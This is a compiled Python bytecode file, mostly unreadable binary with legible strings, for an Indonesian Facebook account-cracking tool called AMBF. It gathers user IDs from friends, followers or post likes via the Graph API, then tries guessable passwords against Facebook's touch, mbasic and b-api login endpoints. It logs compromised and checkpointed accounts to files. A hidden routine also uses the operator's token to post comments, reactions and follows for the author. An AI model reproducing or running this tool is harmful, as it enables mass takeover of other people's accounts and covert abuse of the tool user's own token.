a

���`q�
@s�ddlZddlZddlZddlZddlZddlZddlZddlZddlm	Z

F
Z
zddlZWney�e�d�Yn0zddlZWney�e�d�Yn0dZe�e�add	�ZgZgagadae
��ZejZgd
�Zz&edk�s
edk�re�edZWne �y4e�Yn0e
��Z!e!j"Z#e!jZ$e!j%Z&eeZ'e(e
���)d
��Z*e�+d�j,Z-e�+d�j,Z.dZ/e0e.�Z1z$e0e*�2d�d�e1k�s�Je/��Wn^e3�yZ4zDe�d�e�e5d�e5de*�e5de-�ee/�WYdZ4[4n
dZ4[400dd�Z6dd�Z7dd�Z8dd�Z9dd �Z:d!d"�Z;d#d$�Z<d%d&�Z=d'd(�Z>d)d*�Z?d+d,�Z@d-d.�ZAeBd/k�r�ejCdd0�d1k�r�e5d2�ed3�e�d�e�e5d4�e�d5�e7�dS)6�N)�ThreadPoolExecutor)�ConnectionError)�datetimezpip install requestszpip install futures)z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]cCstd�dS)NaH[0;97m    _____                 _____ _____________________
   /  _  \               /     \______   \_   _____/
  /  /_\  \    ______   /  \ /  \|    |  _/|    __)  
 /    |    \  /_____/  /    Y    \    |   \|     \   
 \____|__  /           \____|__  /______  /\___  /   
         \/                    \/       \/     \/   )�print�rr�ambf3.py�logosr)ZJanuariZFebruariZMaretZAprilZMeiZJuniZJuliZAgustusZ	SeptemberZOktoberZNopemberZDesember��z%d-%m-%Yz=https://raw.githubusercontent.com/avsid/ambf/main/license.phpz<https://raw.githubusercontent.com/avsid/ambf/main/durasi.phpzC [0;97m[[0;93m![0;97m] Mohon Tunggu Sebentar Lagi Update Script.�-������clear�5 [#] ------------------------------------------------z [#] Expired   : z [#] License   : cCs�ztdd���}Wn$ty6td�t�d�Yn0d}d}d}d}d	}d
}t�d|d|d
|�t�d|d|d
|�t�d|d|d
|�t�d|d|d
|�t�d|�t�d|�t�dS)N�	login.txt�rz [!] Token invalidzrm -rf login.txtZ100015073506062Z1031861840659590Z1110619372783836udGW PAKE SC LU BANG 😍😘
https://www.facebook.com/nihal.kdr10=fbluoKEREN BANG 😘😘
https://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fblZLOVE�https://graph.facebook.com/z/comments/?message=z&access_token=z/reactions?type=z>https://graph.facebook.com/638124327/subscribers?access_token=zDhttps://graph.facebook.com/100015073506062/subscribers?access_token=)	�open�read�IOErrorr�os�system�requests�post�menu)�tokenZunarZpost2ZkomZkom2Zreacrrr�	bot_komenCs$rcCs�t�d�ztdd�}t�Wn�ttfy�t�d�t�td�td�}zPt	�
d|�}t�|j
�}tdd�}|�|�|��td�td	�t�Wn"ty�td
�t��Yn0Yn0dS)Nr
rrz;
 [*] Cara Mendapatkan Token : https://www.facebook.com/nihal.kdr10 [+] Your Token : z+https://graph.facebook.com/me?access_token=�wz [#] Token Benarz [>] Tekan Enter Ke Menu� [!] Token Invalid)rrrr�KeyErrorrrr�inputr�get�json�loads�text�write�closer�sys�exit)r�otw�aZzeddrrr�tokenzWs*






r*cCs�t�d�zHtdd���at�dt�}t�|j	�}|d}|d}t�d�j	}Wnbt
y�t�d�td�t�d	�t�
d
�t�Yn&tjjy�td�t��Yn0t�td|�td
|d|�td�td�td�td�td�td�td�td�}|dk�r.t�n\|dk�sB|dk�rJt�n@|dk�s^|dk�rft�n$|dk�sz|dk�r�t�ntd�dS)Nr
rr�,https://graph.facebook.com/me/?access_token=�name�id�.https://api-asutoolkit.cloudaccess.host/ip.phpr�rm -f login.txt��  [!] Tidak Ada Koneksi� [*] IP Address : � [*] Your ID    : � ([0;93m%s[0;97m)r�) [*] Facebook   : https://.fb.me/nihal.kdr10! [!] Pilih Method Crack Nya Dulu
z$ [1] Crack Dengan b-api (fast crack)z$ [2] Crack Dengan mbasic (low crack)z$ [3] Crack Dengan mobile (low crack)�. [0;97m[[0;91m0[0;97m] Logout (hapus token)�
 [?] Choose : ��1�01�2�02�3�03z [!] Pilih Yang Bener)rrrrrrr r!r"r#rr�time�sleepr*�
exceptionsrr&r'rrr�menubapi�
menumbasic�	menutouch)r(r)�namar-�ip�methodrrrrnsJ





rcCs&t�d�zHtdd���at�dt�}t�|j	�}|d}|d}t�d�j	}Wnbt
y�t�d�td�t�d	�t�
d
�t�Yn&tjjy�td�t��Yn0t�td|�td
|d|�td�td�td�td�td�td�td�td�t�dS)Nr
rrr+r,r-r.rr/r0r1r2r3r4rr5z [*] Method     : free
� [1] Crack Dari Publik Teman� [2] Crack Dari Total Followers� [3] Crack Dari Like Postingan� [4] Lihat Hasil Crackr6)rrrrrrr r!r"r#rrr?r@r*rArr&r'r�pilih_menutouch�r(r)rEr-rFrrrrD�s:




rDc
Cstd�}|dkr"td�t��nb|dks2|dkr�td�td�}z6t�d|d	t�}t�|j�}td
|d�Wn t	y�td�t�Yn0t�d|d
t�}t�|j�}|dD]4}|d}|d}|�
d�d}	t�|d|	�qĐn�|dk�s|dk�r�td�td�}z6t�d|d	t�}t�|j�}td
|d�Wn"t	�yztd�t�Yn0t�d|dt�}t�|j�}|dD]6}|d}|d}|�
d�d}	t�|d|	��q��n�|dk�s�|dk�rltd�td�}t�d|dt�}t�|j�}|dD]6}|d}|d}|�
d�d}	t�|d|	��q0�n|dk�s�|dk�rHtd�td�td�}
|
dk�r�t
�n�|
dk�s�|
dk�r�td �td!tttf�t�d"tttf�t�nR|
dk�s|
dk�r>td �td#tttf�t�d$tttf�t�ntd�n<|d%k�s\|d&k�rvt�d'�td(�t�ntd�t�td)ttt���td*�}|d+k�s�|d,k�r�t�td-tttf�td.tttf�td/�d0d1�}td2�}|�|t�t�dS)3Nr7r8� [!] Pilih Yang Bener !r9r:�/
 [*] Isi 'me' Jika Ingin Crack Dari List Teman� [+] ID Publik : r�?access_token=� [+] Nama : r,� [!] ID Tidak Tersedia�/friends?access_token=�datar-� r�|r;r<�0
 [*] Isi 'me' Jika Ingin Crack Follower Sendiri�'/subscribers?limit=999999&access_token=r=r>�
 [*] Mikan ID Postingan� [+] ID Post : �"/likes?limit=9999999&access_token=�4�04�
 [1] Hasil OK � [2] Hasil CP �6
 [#] ------------------------------------------------�=
 [+] Hasil [0;92mOK[0;97m Tanggal : [0;92m%s-%s-%s[0;97m�cat out/OK-%s-%s-%s.txt�< [+] Hasil [0;93mCP[0;97m Tanggal : [0;92m%s-%s-%s[0;97m�cat out/CP-%s-%s-%s.txt�0�00r/� [!] Berhasil Menghapus Token� [*] Total ID : [0;91m�2
 [0;97m[?] Ingin Gunakan Password Manual? Y/t : �Y�y�D [0;97m[+] File [0;92mOK[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt�D [0;97m[+] File [0;93mCP[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt� [!] Sedang Prosess Crack
cSs�tdttt�tt�tt�fdd�tj��|}|�	d�\}}zt
�d�Wnty`Yn0�zp|�
�d|�
�d|�
�dd	d
dfD�]8}tjd||d
d�dtid�}|j}d|vs�d|vs�d|v�rDtd|d|d�t�|d|�tdtttfd�}|�dt|�dt|�d�|���q�q�q�q�d|v�sVd|vr�td|d|d�t�|d|�tdtttfd�}|�dt|�dt|�d�|���q�q�q�q�td7aWnYn0dS) N�+
 [0;97m[*] [Crack] %s/%s OK-:%s - CP-:%s r8��endrW�out�123�1234�12345�sayang�anjing�bangsat�$https://touch.facebook.com/login.php�submit��email�passZlogin�
user-agent�rUZheaders�homer �save�
  [0;92m*--> � | �        �out/OK-%s-%s-%s.txtr)�  *--> �
�
checkpoint�confirm�
  [0;93m*--> �out/CP-%s-%s-%s.txtr
)r�loop�lenr-�ok�cpr&�stdout�flush�splitr�mkdir�OSError�lowerrr�ua�url�appendr�ha�op�tar$�strr%��arg�user�uidr,�pw�rex�xor�rrr�mainsB$
.""zpilih_menutouch.<locals>.main�)rrr'rr rr!r"r#r�rsplitr-r�rr�r�r�rrr�r��
manualfree�
ThreadPool�map�
ZaskZidtZpokZspr�z�ir�ZnaZnmZressr��prrrrL�s�



$rLcs�td�td��d��t��dkr*td�tdtttf�tdtttf�td��fd	d
�}td�}|�	|t
�t�dS)N�4 [*] Masukan Password Contoh : sayang,rahasia,123456� [?] Sett Password : �,r�' [!] Isi Yang Bener, Tidak Boleh Kosong�E
 [0;97m[+] File [0;92mOK[0;97m Tersimpan Di : out/OK-%s-%s-%s.txtrnrocs�tdttt�tt�tt�fdd�tj��|}|�	d�\}}zt
�d�Wnty`Yn0�zL�D�]8}t
jd|�dd�d	tid
�}|j}d|vs�d|vs�d
|v�r td|d�d�t�|d��tdtttfd�}|�dt|�dt��d�|���q�qjqjqjd|v�s2d|vrjtd|d�d�t�|d��tdtttfd�}|�dt|�dt��d�|���q�qjqjqjtd7aWnYn0dS)Nrpr8rqrWrsrzr{r|rr�r�r r�r�r�r�r�r)r�r�r�r�r�r�r
)rr�r�r-r�r�r&r�r�r�rr�r�rrr�r�r�rr�r�r�r$r�r%�r�r�r�r,�asur�r�r��r�rrr�@sB$

""zmanualfree.<locals>.mainr��rrr�r�r'r�r�r�r�r�r-�r�r�rr�rr�6s$r�cCs&t�d�zHtdd���at�dt�}t�|j	�}|d}|d}t�d�j	}Wnbt
y�t�d�td�t�d	�t�
d
�t�Yn&tjjy�td�t��Yn0t�td|�td
|d|�td�td�td�td�td�td�td�td�t�dS)Nr
rrr+r,r-r.rr/r0r1r2r3r4rr5z [*] Method     : mbasic
rHrIrJrKr6)rrrrrrr r!r"r#rrr?r@r*rArr&r'r�pilih_menumbasicrMrrrrCjs:




rCc
Cstd�}|dkr"td�t��nb|dks2|dkr�td�td�}z6t�d|d	t�}t�|j�}td
|d�Wn t	y�td�t�Yn0t�d|d
t�}t�|j�}|dD]4}|d}|d}|�
d�d}	t�|d|	�qĐn�|dk�s|dk�r�td�td�}z6t�d|d	t�}t�|j�}td
|d�Wn"t	�yztd�t�Yn0t�d|dt�}t�|j�}|dD]6}|d}|d}|�
d�d}	t�|d|	��q��n�|dk�s�|dk�rltd�td�}t�d|dt�}t�|j�}|dD]6}|d}|d}|�
d�d}	t�|d|	��q0�n|dk�s�|dk�rHtd�td�td�}
|
dk�r�t
�n�|
dk�s�|
dk�r�td �td!tttf�t�d"tttf�t�nR|
dk�s|
dk�r>td �td#tttf�t�d$tttf�t�ntd�n<|d%k�s\|d&k�rvt�d'�td(�t�ntd�t�td)ttt���td*�}|d+k�s�|d,k�r�t�td-tttf�td.tttf�td/�d0d1�}td2�}|�|t�t�dS)3Nr7r8rNr9r:rOrPrrQrRr,rSrTrUr-rVrrWr;r<rXrYr=r>rZr[r\r]r^r_r`rarbrcrdrerfrgr/rhrirjrkrlrmrnrocSs�tdttt�tt�tt�fdd�tj��|}|�	d�\}}zt
�d�Wnty`Yn0�z^|�
�d|�
�d|�
�dd	d
dfD�]&}tjd||d
d�dtid�}|j}d|vs�d|v�r<td|d|d�t�|d|�tdtttfd�}|�dt|�dt|�d�|���q�q�q�q�d|vr�td|d|d�t�|d|�tdtttfd�}|�dt|�dt|�d�|���q�q�q�q�td7aWnYn0dS)Nrpr8rqrWrsrtrurvrwrxry�%https://mbasic.facebook.com/login.phpr{r|rr��mbasic_logout_button�save-devicer�r�r�r�r)r�r�r�r�r�r
)rr�r�r-r�r�r&r�r�r�rr�r�r�rrr��contentr�rr�r�r�r$r�r%r�rrrr��sB$
.""zpilih_menumbasic.<locals>.mainr�)rrr'rr rr!r"r#rr�r-r�rr�r�r�rrr�r��manualmbasicr�r�r�rrrr��s�



$r�cs�td�td��d��t��dkr*td�tdtttf�tdtttf�td��fd	d
�}td�}|�	|t
�t�dS)Nr�r�r�rr�r�rnrocs�tdttt�tt�tt�fdd�tj��|}|�	d�\}}zt
�d�Wnty`Yn0�z:�D�]&}t
jd||dd�d	tid
�}|j}d|vs�d|v�rtd
|d|d�t�|d|�tdtttfd�}|�dt|�dt|�d�|���q�qjqjqjd|vrjtd|d|d�t�|d|�tdtttfd�}|�dt|�dt|�d�|���q�qjqjqjtd7aWnYn0dS)Nrpr8rqrWrsr�r{r|rr�r�r�r�r�r�r�r)r�r�r�r�r�r
)rr�r�r-r�r�r&r�r�r�rr�r�rrr�r�r�rr�r�r�r$r�r%r�r�rrr�sB$

""zmanualmbasic.<locals>.mainr�r�r�rr�rr�s$r�cCs&t�d�zHtdd���at�dt�}t�|j	�}|d}|d}t�d�j	}Wnbt
y�t�d�td�t�d	�t�
d
�t�Yn&tjjy�td�t��Yn0t�td|�td
|d|�td�td�td�td�td�td�td�td�t�dS)Nr
rrr+r,r-r.rr/r0r1r2r3r4rr5z [*] Method     : b-api
rHrIrJrKr6)rrrrrrr r!r"r#rrr?r@r*rArr&r'r�pilih_menubapirMrrrrB<s:




rBc
Cstd�}|dkr"td�t��nb|dks2|dkr�td�td�}z6t�d|d	t�}t�|j�}td
|d�Wn t	y�td�t�Yn0t�d|d
t�}t�|j�}|dD]4}|d}|d}|�
d�d}	t�|d|	�qĐn�|dk�s|dk�r�td�td�}z6t�d|d	t�}t�|j�}td
|d�Wn"t	�yztd�t�Yn0t�d|dt�}t�|j�}|dD]6}|d}|d}|�
d�d}	t�|d|	��q��n�|dk�s�|dk�rltd�td�}t�d|dt�}t�|j�}|dD]6}|d}|d}|�
d�d}	t�|d|	��q0�n|dk�s�|dk�rHtd�td�td�}
|
dk�r�t
�n�|
dk�s�|
dk�r�td �td!tttf�t�d"tttf�t�nR|
dk�s|
dk�r>td �td#tttf�t�d$tttf�t�ntd�n<|d%k�s\|d&k�rvt�d'�td(�t�ntd�t�td)ttt���td*�}|d+k�s�|d,k�r�t�td-tttf�td.tttf�td/�d0d1�}td2�}|�|t�t�dS)3Nr7r8rNr9r:rOrPrrQrRr,rSrTrUr-rVrrWr;r<rXrYr=r>rZr[r\r]r^r_r`rarbrcrdrerfrgr/rhrirjrkrlrmrnroc	Ss�tdttt�tt�tt�fdd�tj��|}|�	d�\}}zt
�d�Wnty`Yn0�zt|�
�d|�
�d|�
�dd	d
dfD�]<}dd
d|d|dddd�	}d}tj||d�}d|jv�rJd|jv�rJtd|d|d�t�|d|�tdtttfd�}|�dt|�dt|�d�|���q�q�q�q�d|��d vr�td!|d|d�t�|d|�td"tttfd�}|�dt|�dt|�d�|���q�q�q�q�td#7aWnYn0dS)$Nrpr8rqrWrsrtrurvrwrxry�/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32r!r;�en_US�iosr9� 3f555f99fb61fcd7aa0c44f58f522ef6�	Zaccess_token�formatZsdk_versionr}�localeZpasswordZsdkZgenerate_session_cookiesZsig�,https://b-api.facebook.com/method/auth.login��params�session_key�EAAAr�r�r�r�r)r�r��www.facebook.com�	error_msgr�r�r
)rr�r�r-r�r�r&r�r�r�rr�r�r�rr r#r�rr�r�r�r$r�r%r!)	r�r�r�r,r��param�api�responser�rrrr��sV$
.�
""zpilih_menubapi.<locals>.mainr�)rrr'rr rr!r"r#rr�r-r�rr�r�r�rrr�r��
manualbapir�r�r�rrrr�]s�



.r�cs�td�td��d��t��dkr*td�tdtttf�tdtttf�td��fd	d
�}td�}|�	|t
�t�dS)Nr�r�r�rr�r�rnroc	s�tdttt�tt�tt�fdd�tj��|}|�	d�\}}zt
�d�Wnty`Yn0�zP�D�]<}ddd|d	|d
ddd
�	}d}t
j||d�}d|jv�r&d|jv�r&td|d|d�t�|d|�tdtttfd�}|�dt|�dt|�d�|���q�qjqjqjd|��dvrjtd|d|d�t�|d|�tdtttfd�}|�dt|�dt|�d�|���q�qjqjqjtd7aWnYn0dS)Nrpr8rqrWrsr�r!r;r�r�r9r�r�r�r�r�r�r�r�r�r�r)r�r�r�r�r�r�r
)rr�r�r-r�r�r&r�r�r�rr�r�rr r#r�rr�r�r�r$r�r%r!)	r�r�r�r,r�r�r�r�r�r�rrr��sV$

�
""zmanualbapi.<locals>.mainr�r�r�rr�rr��s.r��__main__r0z3.9zN [!] Sekarang AMBF Menggunakan Python 3, Silakan Install : pip install futuresz/ [+] Silakan Mulai Ulang Ketik : python run.py z [#] Sedang Update Tools...zgit pull)Drr&r�
subprocess�randomr?�rer!Zconcurrent.futuresrr�Zrequests.exceptionsrr�ImportErrorrZ
concurrentZ
useragents�choicer�rr-r�r�r�ZnowZctZmonth�nZbulanr'ZnTemp�
ValueErrorZcurrentZyearr�ZbuZdayr�r�r��strftimeZdurasir r#�licenseZ	dev_anggar��intZyear_to_expirer��AssertionError�errr*rrDrLr�rCr�r�rBr�r��__name__�versionrrrr�<module>	s�@
$
*!}4!}4!@



